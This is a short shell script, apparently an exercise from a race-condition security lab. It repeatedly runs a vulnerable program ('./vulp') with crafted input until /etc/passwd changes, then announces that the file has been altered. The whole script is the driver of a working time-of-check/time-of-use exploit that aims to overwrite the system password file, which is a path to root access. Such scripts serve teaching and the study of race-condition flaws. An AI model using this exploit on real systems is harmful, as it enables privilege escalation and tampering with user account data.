#!/bin/sh


old=`ls -l /etc/passwd`
new=`ls -l /etc/passwd`

#if [ -f /tmp/XYZ ]
#then
#    rm -f /tmp/XYZ
#fi
#
#touch /tmp/XYZ

while [ "$old" = "$new" ]
do

    ./vulp < test
    new=`ls -l /etc/passwd`
    #echo $new
    
done

echo "STOP... The shadow file has been changed"
